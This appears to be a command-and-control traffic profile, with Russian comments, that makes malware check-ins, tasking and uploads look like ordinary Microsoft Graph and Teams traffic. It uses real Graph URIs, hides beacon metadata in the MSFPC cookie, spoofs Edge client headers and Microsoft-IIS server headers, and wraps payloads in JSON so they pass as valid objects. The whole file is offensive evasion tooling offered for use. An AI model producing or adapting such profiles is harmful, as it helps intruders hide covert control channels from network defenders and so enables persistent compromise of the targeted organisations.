# Microsoft Graph API — имитация штатного трафика Microsoft 365 / Teams.
# URI-паттерны совпадают с реальным Graph API; cookie MSFPC присутствует
# на всех машинах с активным аккаунтом Microsoft.

[http-get]
uri_checkin     = "/v1.0/me/activities"
uri_task        = "/v1.0/me/mailFolders/inbox/messages"
verb            = "GET"
metadata_cookie = "MSFPC"

[http-get.client_headers]
"User-Agent"         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
"Accept"             = "application/json"
"Accept-Language"    = "en-US,en;q=0.9"
"Accept-Encoding"    = "gzip, deflate, br"
"Cache-Control"      = "no-cache"
"Pragma"             = "no-cache"
"Sec-Fetch-Dest"     = "empty"
"Sec-Fetch-Mode"     = "cors"
"Sec-Fetch-Site"     = "cross-site"
"Sec-Ch-Ua"          = "\"Microsoft Edge\";v=\"124\", \"Chromium\";v=\"124\", \"Not-A.Brand\";v=\"99\""
"Sec-Ch-Ua-Mobile"   = "?0"
"Sec-Ch-Ua-Platform" = "\"Windows\""

[http-post]
uri  = "/v1.0/me/sendMail"
verb = "POST"

[http-post.client_headers]
"Content-Type"       = "application/json; charset=utf-8"
"User-Agent"         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
"Accept"             = "application/json"
"Accept-Encoding"    = "gzip, deflate, br"
"Sec-Fetch-Dest"     = "empty"
"Sec-Fetch-Mode"     = "cors"
"Sec-Fetch-Site"     = "cross-site"

[server]
status       = 200
content_type = "application/json; charset=utf-8"
# wrap: фигурные скобки и кавычки — вне base64url-алфавита, payload не повреждается.
# Тело выглядит как {"@":"<base64url>"} — валидный JSON-объект на первый взгляд.
wrap_prefix  = "{\"@\":\""
wrap_suffix  = "\"}"

[server.headers]
"Server"                    = "Microsoft-IIS/10.0"
"X-Powered-By"              = "ASP.NET"
"Cache-Control"             = "no-store, no-cache"
"Strict-Transport-Security" = "max-age=31536000; includeSubDomains"
"X-Content-Type-Options"    = "nosniff"
"X-Frame-Options"           = "DENY"
"Access-Control-Allow-Origin" = "https://teams.microsoft.com"
